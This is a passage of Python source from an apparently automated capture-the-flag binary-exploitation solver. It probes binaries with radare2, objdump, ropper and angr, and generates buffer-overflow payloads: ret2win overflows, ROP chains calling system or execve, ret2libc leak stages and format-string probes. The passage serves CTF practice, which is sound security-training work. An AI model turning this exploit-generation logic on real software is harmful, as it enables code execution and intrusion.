    def _collect_protections(self, binary_path, primary_binary, strings_text, remote_context, artifact_root, memory):
        detected_bits = str(primary_binary.get("bits", "") or "")
        if not detected_bits and self.toolkit_tool:
            detected_bits = self.toolkit_tool.detect_binary_bitness(binary_path)
        protections = {
            "arch": primary_binary.get("binary_kind", ""),
            "bits": detected_bits or ("64" if "64" in strings_text else ("32" if "32" in strings_text else "")),
            "format": primary_binary.get("binary_kind", ""),
            "pie": False,
            "nx": False,
            "relro": False,
            "canary_hint": "__stack_chk_fail" in strings_text,
        }
        if remote_context:
            result = self._run_remote_template(
                remote_context,
                "binary-checksec",
                artifact_root,
                binary_path.stem,
                memory,
                sample_path=remote_context["binary_path"],
                binary_name=binary_path.name,
            )
            payload = dict(result.get("payload") or {})
            if payload:
                protections.update(
                    {
                        "arch": payload.get("arch") or protections.get("arch"),
                        "bits": payload.get("bits") or protections.get("bits"),
                        "format": payload.get("format") or protections.get("format"),
                    }
                )
                remote_protections = dict(payload.get("protections") or {})
                for key in ["pie", "nx", "relro", "canary_hint"]:
                    if key in remote_protections:
                        protections[key] = bool(remote_protections.get(key))
        self.file_tool.write_json(artifact_root / "binary_protections.json", protections)
        memory.record_action("extract", "collect protections", "ok", json.dumps(protections, ensure_ascii=False))
        return protections

    def _collect_remote_pwn_probe(self, binary_path, artifact_root, remote_context, memory, binary_context):
        host = str(remote_context.get("host") or "")
        sample_path = str(remote_context.get("binary_path") or "")
        if not host or not sample_path or not self.remote_tool:
            return {}
        code = """import base64, json, re, struct, subprocess, sys
path = sys.argv[1]
payload = {
    "status": "ok",
    "path": path,
    "arch": "",
    "bits": "",
    "ret2win_symbols": [],
    "ret2win_targets": [],
    "leak_functions": [],
    "got_targets": [],
    "plt_targets": [],
    "ret2libc_plans": [],
    "rop_call_targets": [],
    "arg_string_targets": [],
    "fmt_clues": [],
    "rop_hints": [],
    "raw_payloads": [],
    "interesting_strings": [],
    "functions": [],
    "imports": [],
    "candidate_inputs": [],
    "tool_status": {},
}
try:
    import r2pipe
    payload["tool_status"]["r2pipe"] = "ok"
    r = r2pipe.open(path, flags=["-2"])
    try:
        r.cmd("aa")
    except Exception:
        pass
    try:
        info = json.loads(r.cmd("ij") or "{}")
    except Exception:
        info = {}
    bininfo = dict(info.get("bin") or {})
    payload["arch"] = str(bininfo.get("arch") or "")
    payload["bits"] = str(bininfo.get("bits") or "")
    try:
        funcs = json.loads(r.cmd("aflj") or "[]")
    except Exception:
        funcs = []
    try:
        imports = json.loads(r.cmd("iij") or "[]")
    except Exception:
        imports = []
    try:
        strings = json.loads(r.cmd("izj") or "[]")
    except Exception:
        strings = []
    try:
        with open(path, "rb") as handle:
            raw_blob = handle.read()
    except Exception:
        raw_blob = b""
    func_rows = []
    func_names = []
    for item in funcs:
        name = str(item.get("name") or "").strip()
        if not name:
            continue
        func_names.append(name)
        try:
            offset = int(item.get("offset") or 0)
        except Exception:
            offset = 0
        func_rows.append({"name": name, "offset": offset})
        lowered = name.lower()
        if any(token in lowered for token in ["leak", "dump", "reveal", "show_addr", "showaddr"]):
            payload["leak_functions"].append({"name": name, "offset": "0x%x" % offset})
    import_names = [str(item.get("name") or "") for item in imports if str(item.get("name") or "").strip()]
    string_values = [str(item.get("string") or item.get("name") or "") for item in strings if str(item.get("string") or item.get("name") or "").strip()]
    string_rows = []
    for item in strings:
        value = str(item.get("string") or item.get("name") or "").strip()
        if not value:
            continue
        try:
            vaddr = int(item.get("vaddr") or item.get("paddr") or 0)
        except Exception:
            vaddr = 0
        string_rows.append({"value": value, "vaddr": vaddr})
    if raw_blob:
        for blob in re.findall(rb"[\\x20-\\x7e]{4,}", raw_blob)[:200]:
            text = blob.decode("utf-8", errors="replace").strip()
            if text:
                string_values.append(text)
    payload["functions"] = func_names[:40]
    payload["imports"] = import_names[:40]
    lower_symbols = []
    for name in func_names + import_names:
        lowered = name.lower()
        lower_symbols.append((name, lowered))
        if any(token in lowered for token in ["win", "flag", "shell", "system", "exec"]):
            payload["ret2win_symbols"].append(name)
        if any(token in lowered for token in ["printf", "fprintf", "sprintf", "snprintf", "puts"]):
            payload["fmt_clues"].append(name)
    for row in func_rows:
        lowered = row["name"].lower()
        if any(token in lowered for token in ["win", "flag", "print_flag", "get_flag", "give_flag", "emit_flag"]):
            payload["ret2win_targets"].append({"name": row["name"], "offset": "0x%x" % row["offset"]})
        if any(token in lowered for token in ["system", "execve", "execl", "execlp"]):
            payload["rop_call_targets"].append({"name": row["name"], "offset": "0x%x" % row["offset"]})
    for value in string_values:
        lowered = value.lower()
        if any(token in lowered for token in ["flag", "win", "ret2win", "%p", "%s", "%n", "/bin/sh", "payload", "input"]):
            payload["interesting_strings"].append(value[:160])
        for quoted in re.findall(r'["\\']([^"\\'\\n]{3,80})["\\']', value):
            token = str(quoted or "").strip()
            if not token:
                continue
            if "flag{" in token.lower():
                continue
            if token not in payload["candidate_inputs"]:
                payload["candidate_inputs"].append(token[:80])
        if any(token in lowered for token in ["ret2win", "win", "print_flag", "get_flag"]):
            payload["candidate_inputs"].append(value[:80])
            payload["ret2win_symbols"].append(value[:80])
        if "%p" in lowered or "%n" in lowered or "%s" in lowered:
            payload["fmt_clues"].append(value[:80])
    dedup_call_targets = []
    seen_call_targets = set()
    for item in payload["rop_call_targets"]:
        marker = (str(item.get("name") or "").lower(), str(item.get("offset") or "").lower())
        if marker in seen_call_targets:
            continue
        seen_call_targets.add(marker)
        dedup_call_targets.append(item)
    payload["rop_call_targets"] = dedup_call_targets[:8]
    arg_targets = []
    seen_arg_targets = set()
    for item in string_rows:
        value = str(item.get("value") or "").strip()
        lowered = value.lower()
        if not value or not int(item.get("vaddr") or 0):
            continue
        if not any(token in lowered for token in ["/bin/", "sh -c", "printf ", "cat ", "echo "]):
            continue
        marker = (lowered, int(item.get("vaddr") or 0))
        if marker in seen_arg_targets:
            continue
        seen_arg_targets.add(marker)
        arg_targets.append({"value": value[:160], "vaddr": "0x%x" % int(item.get("vaddr") or 0)})
    payload["arg_string_targets"] = arg_targets[:8]
    payload["ret2win_symbols"] = list(dict.fromkeys(payload["ret2win_symbols"]))[:12]
    dedup_targets = []
    seen_targets = set()
    for item in payload["ret2win_targets"]:
        marker = (str(item.get("name") or "").lower(), str(item.get("offset") or "").lower())
        if marker in seen_targets:
            continue
        seen_targets.add(marker)
        try:
            disasm = r.cmd("pdf @ " + str(item.get("name") or "")) or ""
        except Exception:
            disasm = ""
        arg_hints = []
        for line in str(disasm or "").splitlines():
            lowered_line = line.lower()
            if ("movabs" not in lowered_line) and (not re.search(r",\s*0x[0-9a-f]{4,16}", lowered_line)):
                continue
            tokens = re.findall(r"0x[0-9a-f]{4,16}", lowered_line)
            if not tokens:
                continue
            token = tokens[-1]
            try:
                value = int(token, 16)
            except Exception:
                continue
            if value in {0, 1}:
                continue
            arg_hints.append("0x%x" % value)
        if arg_hints:
            item = dict(item)
            item["arg_hints"] = list(dict.fromkeys(arg_hints))[:4]
        dedup_targets.append(item)
    payload["ret2win_targets"] = dedup_targets[:8]
    payload["fmt_clues"] = list(dict.fromkeys(payload["fmt_clues"]))[:12]
    payload["interesting_strings"] = list(dict.fromkeys(payload["interesting_strings"]))[:20]
except Exception as exc:
    payload["tool_status"]["r2pipe"] = "error:" + type(exc).__name__
try:
    completed = subprocess.run(
        ["objdump", "-d", path],
        capture_output=True,
        text=True,
        timeout=20,
    )
    output = (completed.stdout or "") + "\\n" + (completed.stderr or "")
    if completed.returncode == 0:
        payload["tool_status"]["objdump-disasm"] = "ok"
        plt_targets = []
        for line in output.splitlines():
            match = re.match(r"^\\s*([0-9a-fA-F]+)\\s+<([^>]+)>:$", line)
            if not match:
                continue
            addr = int(match.group(1), 16)
            name = str(match.group(2) or "").strip()
            if not name:
                continue
            if name.endswith("@plt"):
                base_name = name[:-4]
                plt_targets.append({"name": base_name, "offset": "0x%x" % addr})
        payload["plt_targets"] = plt_targets[:32]
    else:
        payload["tool_status"]["objdump-disasm"] = "error:returncode"
except Exception as exc:
    payload["tool_status"]["objdump-disasm"] = "error:" + type(exc).__name__
try:
    completed = subprocess.run(
        ["objdump", "-R", path],
        capture_output=True,
        text=True,
        timeout=20,
    )
    output = (completed.stdout or "") + "\\n" + (completed.stderr or "")
    if completed.returncode == 0:
        payload["tool_status"]["objdump-reloc"] = "ok"
        got_targets = []
        for line in output.splitlines():
            match = re.match(r"^\\s*([0-9a-fA-F]+)\\s+\\S+\\s+([^\\s@]+)", line)
            if not match:
                continue
            addr = int(match.group(1), 16)
            name = str(match.group(2) or "").strip()
            if not name:
                continue
            got_targets.append({"name": name, "offset": "0x%x" % addr})
        payload["got_targets"] = got_targets[:48]
    else:
        payload["tool_status"]["objdump-reloc"] = "error:returncode"
except Exception as exc:
    payload["tool_status"]["objdump-reloc"] = "error:" + type(exc).__name__
try:
    for query in ["pop rdi; ret", "ret"]:
        completed = subprocess.run(
            [sys.executable, "-m", "ropper", "--file", path, "--search", query],
            capture_output=True,
            text=True,
            timeout=20,
        )
        output = (completed.stdout or "") + "\\n" + (completed.stderr or "")
        if completed.returncode == 0:
            payload["tool_status"]["ropper"] = "ok"
        else:
            payload["tool_status"]["ropper"] = "error:returncode"
        for line in output.splitlines():
            text = re.sub(r"\\x1b\\[[0-9;]*m", "", line).strip()
            if "0x" in text and ";" in text:
                text = text[text.find("0x"):].strip()
            if text.startswith("0x") and text not in payload["rop_hints"]:
                payload["rop_hints"].append(text[:160])
except Exception as exc:
    payload["tool_status"]["ropper"] = "error:" + type(exc).__name__
try:
    completed = subprocess.run(
        ["objdump", "-d", path],
        capture_output=True,
        text=True,
        timeout=20,
    )
    output = (completed.stdout or "") + "\\n" + (completed.stderr or "")
    if completed.returncode == 0:
        payload["tool_status"]["objdump-gadgets"] = "ok"
        dis_lines = output.splitlines()
        for index, raw_line in enumerate(dis_lines):
            line = str(raw_line or "").rstrip()
            match = re.match(r"^\\s*([0-9a-fA-F]+):\\s+[0-9a-fA-F ]+\\s+(.+)$", line)
            if not match:
                continue
            addr = int(match.group(1), 16)
            mnemonic = str(match.group(2) or "").strip().lower()
            if mnemonic.startswith("pop") and "%rdi" in mnemonic:
                next_line = str(dis_lines[index + 1] or "").rstrip() if index + 1 < len(dis_lines) else ""
                next_match = re.match(r"^\\s*([0-9a-fA-F]+):\\s+[0-9a-fA-F ]+\\s+(.+)$", next_line)
                next_mnemonic = str(next_match.group(2) or "").strip().lower() if next_match else ""
                if next_mnemonic.startswith("ret"):
                    gadget = "0x%016x: pop rdi; ret;" % addr
                    if gadget not in payload["rop_hints"]:
                        payload["rop_hints"].insert(0, gadget)
            elif mnemonic == "ret" or mnemonic.startswith("ret "):
                gadget = "0x%016x: ret;" % addr
                if gadget not in payload["rop_hints"]:
                    payload["rop_hints"].append(gadget)
    else:
        payload["tool_status"]["objdump-gadgets"] = "error:returncode"
except Exception as exc:
    payload["tool_status"]["objdump-gadgets"] = "error:" + type(exc).__name__
payload["rop_hints"] = payload["rop_hints"][:10]
try:
    bits = int(payload.get("bits") or 0)
except Exception:
    bits = 0
ret_gadget = ""
pop_rdi_gadget = ""
pop_rdi_addr = 0
raw_labels = []
ret_candidates = []
for item in payload["rop_hints"]:
    text = str(item or "").strip()
    lowered_text = text.lower()
    if (not pop_rdi_gadget) and ": pop rdi; ret" in lowered_text:
        pop_rdi_gadget = text.split(":", 1)[0].strip()
    if ": ret;" in lowered_text or lowered_text.endswith(": ret"):
        ret_candidates.append(text.split(":", 1)[0].strip())
    elif ": ret " in lowered_text:
        continue
if ret_candidates:
    ret_gadget = ret_candidates[0]
if pop_rdi_gadget:
    try:
        pop_rdi_addr = int(pop_rdi_gadget, 16)
    except Exception:
        pop_rdi_addr = 0
if payload["ret2win_targets"] and bits in {32, 64}:
    offsets = [72, 88, 104, 120, 136] if bits == 64 else [44, 52, 60, 68]
    packer = (lambda value: struct.pack("<Q", value)) if bits == 64 else (lambda value: struct.pack("<I", value))
    ret_addr = 0
    if ret_gadget:
        try:
            ret_addr = int(ret_gadget, 16)
        except Exception:
            ret_addr = 0
    for target in payload["ret2win_targets"][:2]:
        try:
            win_addr = int(str(target.get("offset") or "0"), 16)
        except Exception:
            continue
        if bits == 64 and pop_rdi_addr:
            arg_values = []
            for token in list(target.get("arg_hints") or [])[:2]:
                try:
                    arg_values.append(int(str(token or "0"), 16))
                except Exception:
                    continue
            for arg_value in arg_values[:2]:
                for offset in offsets[:3]:
                    chain = (b"A" * int(offset)) + packer(pop_rdi_addr) + packer(arg_value) + packer(win_addr)
                    label = "rop-rdi@%d-0x%x" % (offset, arg_value)
                    payload["raw_payloads"].append({
                        "label": label,
                        "kind": "rop-ret2win",
                        "target": str(target.get("name") or ""),
                        "offset": int(offset),
                        "argument": "0x%x" % int(arg_value),
                        "encoding": "base64",
                        "b64": base64.b64encode(chain).decode(),
                    })
                    raw_labels.append("RAWPAYLOAD:" + label)
                    if ret_addr:
                        aligned = (b"A" * int(offset)) + packer(ret_addr) + packer(pop_rdi_addr) + packer(arg_value) + packer(win_addr)
                        aligned_label = "rop-rdi-ret-align@%d-0x%x" % (offset, arg_value)
                        payload["raw_payloads"].append({
                            "label": aligned_label,
                            "kind": "rop-ret2win",
                            "target": str(target.get("name") or ""),
                            "offset": int(offset),
                            "argument": "0x%x" % int(arg_value),
                            "encoding": "base64",
                            "b64": base64.b64encode(aligned).decode(),
                        })
                        raw_labels.append("RAWPAYLOAD:" + aligned_label)
        for offset in offsets[:3]:
            blob = (b"A" * int(offset)) + packer(win_addr)
            label = "ret2win-direct@%d" % offset
            payload["raw_payloads"].append({
                "label": label,
                "kind": "ret2win",
                "target": str(target.get("name") or ""),
                "offset": int(offset),
                "encoding": "base64",
                "b64": base64.b64encode(blob).decode(),
            })
            raw_labels.append("RAWPAYLOAD:" + label)
            if ret_addr and bits == 64:
                aligned = (b"A" * int(offset)) + packer(ret_addr) + packer(win_addr)
                payload["raw_payloads"].append({
                    "label": "ret2win-ret-align@%d" % offset,
                    "kind": "ret2win",
                    "target": str(target.get("name") or ""),
                    "offset": int(offset),
                    "encoding": "base64",
                    "b64": base64.b64encode(aligned).decode(),
                })
                raw_labels.append("RAWPAYLOAD:" + ("ret2win-ret-align@%d" % offset))
    payload["raw_payloads"] = payload["raw_payloads"][:10]
if payload["rop_call_targets"] and payload["arg_string_targets"] and bits == 64 and pop_rdi_addr:
    offsets = [72, 88, 104, 120, 136]
    packer = lambda value: struct.pack("<Q", value)
    ret_addr = 0
    if ret_gadget:
        try:
            ret_addr = int(ret_gadget, 16)
        except Exception:
            ret_addr = 0
    rop_labels = []
    for target in payload["rop_call_targets"][:2]:
        try:
            call_addr = int(str(target.get("offset") or "0"), 16)
        except Exception:
            continue
        for arg in payload["arg_string_targets"][:2]:
            try:
                arg_addr = int(str(arg.get("vaddr") or "0"), 16)
            except Exception:
                continue
            for offset in offsets[:3]:
                chain = (b"A" * int(offset)) + packer(pop_rdi_addr) + packer(arg_addr) + packer(call_addr)
                label = "rop-call@%d-%s" % (offset, str(target.get("name") or "call"))
                payload["raw_payloads"].append({
                    "label": label,
                    "kind": "rop-call",
                    "target": str(target.get("name") or ""),
                    "offset": int(offset),
                    "argument": str(arg.get("vaddr") or ""),
                    "argument_preview": str(arg.get("value") or "")[:120],
                    "encoding": "base64",
                    "b64": base64.b64encode(chain).decode(),
                })
                rop_labels.append("RAWPAYLOAD:" + label)
                if ret_addr:
                    aligned = (b"A" * int(offset)) + packer(ret_addr) + packer(pop_rdi_addr) + packer(arg_addr) + packer(call_addr)
                    aligned_label = "rop-call-ret-align@%d-%s" % (offset, str(target.get("name") or "call"))
                    payload["raw_payloads"].append({
                        "label": aligned_label,
                        "kind": "rop-call",
                        "target": str(target.get("name") or ""),
                        "offset": int(offset),
                        "argument": str(arg.get("vaddr") or ""),
                        "argument_preview": str(arg.get("value") or "")[:120],
                        "encoding": "base64",
                        "b64": base64.b64encode(aligned).decode(),
                    })
                    rop_labels.append("RAWPAYLOAD:" + aligned_label)
    payload["raw_payloads"] = payload["raw_payloads"][:14]
    payload["candidate_inputs"] = rop_labels[:8] + payload["candidate_inputs"]
if payload["leak_functions"] and payload["got_targets"] and payload["arg_string_targets"] and bits == 64 and pop_rdi_addr:
    offsets = [72, 88, 104, 120, 136]
    packer = lambda value: struct.pack("<Q", value)
    ret_addr = 0
    if ret_gadget:
        try:
            ret_addr = int(ret_gadget, 16)
        except Exception:
            ret_addr = 0
    main_addr = 0
    for row in func_rows:
        lowered = str(row.get("name") or "").lower()
        if lowered in {"main", "sym.main"} or lowered.endswith(".main"):
            try:
                main_addr = int(row.get("offset") or 0)
            except Exception:
                main_addr = 0
            if main_addr:
                break
    preferred_leaks = []
    for target in payload["got_targets"]:
        lowered = str(target.get("name") or "").lower()
        if lowered in {"puts", "printf", "read", "write", "setvbuf"}:
            preferred_leaks.append(target)
    if not preferred_leaks:
        preferred_leaks = list(payload["got_targets"])
    leak_labels = []
    for leak_func in payload["leak_functions"][:2]:
        try:
            leak_addr = int(str(leak_func.get("offset") or "0"), 16)
        except Exception:
            continue
        if not leak_addr or not main_addr:
            continue
        for target in preferred_leaks[:2]:
            try:
                leak_got = int(str(target.get("offset") or "0"), 16)
            except Exception:
                continue
            if not leak_got:
                continue
            for arg in payload["arg_string_targets"][:2]:
                try:
                    arg_addr = int(str(arg.get("vaddr") or "0"), 16)
                except Exception:
                    continue
                if not arg_addr:
                    continue
                for offset in offsets[:3]:
                    chain = (b"A" * int(offset)) + packer(pop_rdi_addr) + packer(leak_got) + packer(leak_addr) + packer(main_addr)
                    label = "ret2libc@%d-%s" % (offset, str(target.get("name") or "leak"))
                    plan = {
                        "label": label,
                        "kind": "ret2libc",
                        "offset": int(offset),
                        "leak_symbol": str(target.get("name") or ""),
                        "leak_got": "0x%x" % leak_got,
                        "leak_function": str(leak_func.get("name") or ""),
                        "leak_function_addr": "0x%x" % leak_addr,
                        "return_to": "main",
                        "return_to_addr": "0x%x" % main_addr,
                        "pop_rdi": "0x%x" % pop_rdi_addr,
                        "ret": "0x%x" % ret_addr if ret_addr else "",
                        "argument": "0x%x" % arg_addr,
                        "argument_preview": str(arg.get("value") or "")[:120],
                        "stage1_b64": base64.b64encode(chain).decode(),
                    }
                    payload["ret2libc_plans"].append(plan)
                    leak_labels.append("RET2LIBC:" + label)
                    if ret_addr:
                        aligned = (b"A" * int(offset)) + packer(ret_addr) + packer(pop_rdi_addr) + packer(leak_got) + packer(leak_addr) + packer(main_addr)
                        aligned_label = "ret2libc-ret-align@%d-%s" % (offset, str(target.get("name") or "leak"))
                        aligned_plan = dict(plan)
                        aligned_plan["label"] = aligned_label
                        aligned_plan["ret"] = "0x%x" % ret_addr
                        aligned_plan["stage1_b64"] = base64.b64encode(aligned).decode()
                        payload["ret2libc_plans"].append(aligned_plan)
                        leak_labels.append("RET2LIBC:" + aligned_label)
    payload["ret2libc_plans"] = payload["ret2libc_plans"][:8]
    if leak_labels:
        payload["candidate_inputs"] = leak_labels[:6] + payload["candidate_inputs"]
if payload["ret2win_symbols"]:
    payload["candidate_inputs"].insert(0, "RET2WIN")
payload["candidate_inputs"] = raw_labels[:8] + payload["candidate_inputs"]
if payload["fmt_clues"]:
    payload["candidate_inputs"].extend(["%p.%p.%p", "%7$p", "%7$s"])
payload["candidate_inputs"] = list(dict.fromkeys([item for item in payload["candidate_inputs"] if str(item).strip()]))[:10]
print(json.dumps(payload, ensure_ascii=False, indent=2))
"""
        result = self.remote_tool.run_python(host, code, args=[sample_path], timeout=90, cwd=remote_context.get("workspace", {}).get("workspace_root"))
        artifact = artifact_root / "{0}_{1}_pwn_probe.json".format(binary_path.stem, host)
        probe = {"status": result.get("status", "error"), "host": host, "sample_path": sample_path}
        stdout = str(result.get("stdout", "") or "").strip()
        if stdout:
            try:
                probe.update(json.loads(stdout))
            except Exception:
                probe["stdout"] = stdout
        if result.get("stderr"):
            probe["stderr"] = result.get("stderr", "")
        self.file_tool.write_json(artifact, probe)
        memory.record_action("extract", "remote pwn probe on {0}".format(host), probe.get("status", "error"), "bounded r2pipe/ropper probe", str(artifact))
        if probe.get("status") == "ok":
            if str((probe.get("tool_status") or {}).get("r2pipe", "")).startswith("ok"):
                self._record_binary_tool(binary_context, "r2pipe")
            if str((probe.get("tool_status") or {}).get("ropper", "")).startswith("ok"):
                self._record_binary_tool(binary_context, "ropper")
        return probe

    def _merge_pwn_probe_symbols(self, interesting_symbols, pwn_probe):
        merged = []
        seen = set()
        for item in list(interesting_symbols or []):
            text = str(item or "").strip()
            if not text:
                continue
            marker = text.lower()
            if marker in seen:
                continue
            seen.add(marker)
            merged.append(text)
        for item in list((pwn_probe or {}).get("ret2win_symbols", [])) + list((pwn_probe or {}).get("interesting_strings", [])) + list((pwn_probe or {}).get("rop_hints", [])):
            text = str(item or "").strip()
            if not text:
                continue
            marker = text.lower()
            if marker in seen:
                continue
            seen.add(marker)
            merged.append(text)
        return merged[:40]

    def _merge_pwn_probe_candidates(self, candidate_inputs, pwn_probe):
        merged = []
        seen = set()
        probe_values = list((pwn_probe or {}).get("candidate_inputs", []))
        for value in probe_values:
            text = str(value or "").strip()
            if not text:
                continue
            marker = text.lower()
            if marker in seen:
                continue
            seen.add(marker)
            if text.startswith("RAWPAYLOAD:"):
                merged.append({"value": text, "source": "remote-pwn-probe-raw", "confidence": 0.995})
            elif text.startswith("RET2LIBC:"):
                merged.append({"value": text, "source": "remote-pwn-probe-ret2libc", "confidence": 0.997})
            else:
                merged.append({"value": text, "source": "remote-pwn-probe", "confidence": 0.93 if text == "RET2WIN" else 0.78})
        for item in list(candidate_inputs or []):
            text = str(item.get("value", "") or "").strip()
            if not text:
                continue
            marker = text.lower()
            if marker in seen:
                continue
            seen.add(marker)
            merged.append(item)
        return merged[:16]

    def _merge_angr_probe_candidates(self, candidate_inputs, angr_probe):
        merged = []
        seen = set()
        probe_values = list((angr_probe or {}).get("candidate_inputs", []))
        for value in probe_values:
            text = str(value or "").strip()
            if not text:
                continue
            marker = text.lower()
            if marker in seen:
                continue
            seen.add(marker)
            merged.append({"value": text, "source": "remote-angr-probe", "confidence": 0.97})
        for item in list(candidate_inputs or []):
            text = str(item.get("value", "") or "").strip()
            if not text:
                continue
            marker = text.lower()
            if marker in seen:
                continue
            seen.add(marker)
            merged.append(item)
        return merged[:16]

    def _collect_remote_angr_probe(self, binary_path, artifact_root, remote_context, memory, binary_context, subtype=""):
        host = str(remote_context.get("host") or "")
        sample_path = str(remote_context.get("binary_path") or "")
        if not host or not sample_path or not self.remote_tool:
            return {}
        if str(subtype or "").lower() in {"ret2win", "format-string"}:
            return {"status": "skipped", "reason": "subtype has cheaper validated paths"}
        head = self.file_tool.read_bytes(binary_path, limit_bytes=4)
        if not (head.startswith(b"\x7fELF") or head.startswith(b"MZ")):
            return {"status": "skipped", "reason": "angr probe only runs on native ELF/PE samples"}
        try:
            if binary_path.stat().st_size > 5 * 1024 * 1024:
                return {"status": "skipped", "reason": "binary larger than bounded angr budget"}
        except Exception:
            pass
        code = """import json, os, sys
payload = {
    "status": "ok",
    "path": sys.argv[1],
    "candidate_inputs": [],
    "candidate_outputs": [],
    "tool_status": {},
    "solve_mode": "stdin",
}
path = sys.argv[1]
try:
    import angr
    import claripy
    payload["tool_status"]["angr"] = "ok"
    size = os.path.getsize(path)
    if size > 5 * 1024 * 1024:
        payload["status"] = "skipped"
        payload["reason"] = "binary larger than bounded angr budget"
    else:
        proj = angr.Project(path, auto_load_libs=False)
        sym = claripy.BVS("stdin", 32 * 8)
        stdin = angr.SimFileStream(name="stdin", content=sym, has_end=False)
        state = proj.factory.full_init_state(stdin=stdin)
        for chunk in sym.chop(8):
            state.solver.add(
                claripy.Or(
                    claripy.And(chunk >= 0x20, chunk <= 0x7e),
                    chunk == 0x0a,
                    chunk == 0x00,
                )
            )
        simgr = proj.factory.simgr(state)
        def is_find(st):
            blob = st.posix.dumps(1) + b"\\n" + st.posix.dumps(2)
            lower = blob.lower()
            return b"flag{" in lower or b"correct" in lower or b"granted" in lower
        simgr.explore(find=is_find, num_find=1)
        if simgr.found:
            found = simgr.found[0]
            data = found.solver.eval(sym, cast_to=bytes)
            candidate = data.split(b"\\x00", 1)[0].rstrip()
            text = candidate.decode("latin-1", errors="ignore").strip()
            out = (found.posix.dumps(1) + b"\\n" + found.posix.dumps(2)).decode("latin-1", errors="ignore")
            payload["candidate_inputs"] = [text] if text else []
            payload["candidate_outputs"] = [out[:2000]] if out.strip() else []
            payload["solved"] = bool(text)
            payload["find_reason"] = "stdout/stderr constraint satisfied"
        else:
            payload["solved"] = False
except Exception as exc:
    payload["status"] = "error"
    payload["tool_status"]["angr"] = "error:" + type(exc).__name__
    payload["error"] = str(exc)
print(json.dumps(payload, ensure_ascii=False, indent=2))
"""
        result = self.remote_tool.run_python(
            host,
            code,
            args=[sample_path],
            timeout=150,
            cwd=remote_context.get("workspace", {}).get("workspace_root"),
        )
        artifact = artifact_root / "{0}_{1}_angr_probe.json".format(binary_path.stem, host)
        probe = {"status": result.get("status", "error"), "host": host, "sample_path": sample_path}
        stdout = str(result.get("stdout", "") or "").strip()
        if stdout:
            try:
                probe.update(json.loads(stdout))
            except Exception:
                probe["stdout"] = stdout
        if result.get("stderr"):
            probe["stderr"] = result.get("stderr", "")
        self.file_tool.write_json(artifact, probe)
        memory.record_action(
            "extract",
            "remote angr probe on {0}".format(host),
            probe.get("status", "error"),
            probe.get("reason", "") or "bounded angr probe",
            str(artifact),
        )
        if probe.get("status") == "ok" and str((probe.get("tool_status") or {}).get("angr", "")).startswith("ok"):
            self._record_binary_tool(binary_context, "angr")
        return probe

    def _collect_pwn_wave2_reports(
        self,
        challenge,
        binary_path,
        protections,
        artifact_root,
        remote_context,
        memory,
        binary_context,
        pwn_probe=None,
    ):
        payload = {"env_doctor": {}, "reports": [], "debug_helpers": []}
        if not remote_context or not self.remote_tool:
            return payload

        pwn_capabilities = dict(remote_context.get("pwn_capabilities") or {})
        payload["debug_helpers"] = self._prepare_pwn_remote_debug_helpers(binary_path, artifact_root, remote_context)
        libc_ident_leaks = self._collect_pwn_libc_ident_hints(pwn_probe, binary_context)

        remote_libc_path = ""
        remote_ld_path = ""
        local_libc_path = self._find_support_attachment(challenge.attachments, attachment_type="libc", skip_path=binary_path)
        local_ld_path = self._find_support_attachment(challenge.attachments, attachment_type="ld", skip_path=binary_path)
        if local_libc_path:
            remote_libc_path = self._upload_remote_support_attachment(
                remote_context,
                local_libc_path,
                artifact_root,
                memory,
                binary_path.stem,
            )
        if local_ld_path:
            remote_ld_path = self._upload_remote_support_attachment(
                remote_context,
                local_ld_path,
                artifact_root,
                memory,
                binary_path.stem,
            )

        sequence = [
            {
                "kind": "pwn-env-doctor",
                "variables": {"sample_path": remote_context.get("binary_path", "")},
            }
        ]

        if pwn_capabilities.get("qemu_user") and self._should_use_qemu_lane(protections, pwn_probe):
            qemu_bin = str(((pwn_capabilities.get("details") or {}).get("qemu_user") or {}).get("value") or "").strip()
            sequence.append(
                {
                    "kind": "pwn-qemu-run",
                    "variables": {
                        "sample_path": remote_context.get("binary_path", ""),
                        "qemu_bin": qemu_bin,
                        "binary_args": [],
                    },
                }
            )

        if remote_libc_path or remote_ld_path:
            sequence.append(
                {
                    "kind": "pwn-libc-ident",
                    "variables": {
                        "sample_path": remote_context.get("binary_path", ""),
                        "libc_path": remote_libc_path,
                        "ld_path": remote_ld_path,
                        "leaks": libc_ident_leaks,
                    },
                }
            )
            if pwn_capabilities.get("pwninit") and remote_libc_path and remote_ld_path:
                sequence.append(
                    {
                        "kind": "pwninit-bootstrap",
                        "variables": {
                            "sample_path": remote_context.get("binary_path", ""),
                            "libc_path": remote_libc_path,
                            "ld_path": remote_ld_path,
                        },
                    }
                )
            elif pwn_capabilities.get("libc_patch_tooling"):
                sequence.append(
                    {
                        "kind": "pwn-libc-setup",
                        "variables": {
                            "sample_path": remote_context.get("binary_path", ""),
                            "libc_path": remote_libc_path,
                            "ld_path": remote_ld_path,
                            "output_path": "{0}.patched".format(remote_context.get("binary_path", "")),
                        },
                    }
                )
            if pwn_capabilities.get("one_gadget") and remote_libc_path:
                sequence.append(
                    {
                        "kind": "one-gadget-check",
                        "variables": {
                            "libc_path": remote_libc_path,
                        },
                    }
                )

        for spec in sequence:
            result = self._run_remote_template(
                remote_context,
                spec["kind"],
                artifact_root,
                binary_path.stem,
                memory,
                **dict(spec.get("variables") or {}),
            )
            if spec["kind"] == "pwn-env-doctor":
                payload["env_doctor"] = dict(result.get("payload") or {})
            report = {
                "template_kind": spec["kind"],
                "status": result.get("status", ""),
                "artifact": result.get("artifact", ""),
                "payload": dict(result.get("payload") or {}),
            }
            payload["reports"].append(report)
            for flag in self.verifier.discover_from_text(
                "\n".join(
                    [
                        str(report["payload"].get("stdout", "")),
                        str(report["payload"].get("stderr", "")),
                    ]
                )
            ):
                memory.add_candidate_flag(flag, "binary:{0}".format(spec["kind"]), 0.985, reproducible=True)

        return payload

    def _collect_pwn_libc_ident_hints(self, pwn_probe, binary_context):
        hints = []
        seen = set()

        def add_hint(value):
            text = str(value or "").strip()
            marker = text.lower()
            if not text or marker in seen:
                return
            seen.add(marker)
            hints.append(text)

        pwn_probe = dict(pwn_probe or {})
        binary_context = dict(binary_context or {})
        for item in list(pwn_probe.get("ret2libc_plans") or [])[:4]:
            plan = dict(item or {})
            add_hint("leak_symbol={0}".format(plan.get("leak_symbol", "")))
            add_hint("leak_got={0}".format(plan.get("leak_got", "")))
            add_hint("return_to={0}".format(plan.get("return_to", "")))
        for item in list(binary_context.get("leak_artifacts") or [])[:6]:
            if isinstance(item, dict):
                symbol = str(item.get("symbol") or item.get("leak_symbol") or "").strip()
                address = str(item.get("address") or item.get("leak") or "").strip()
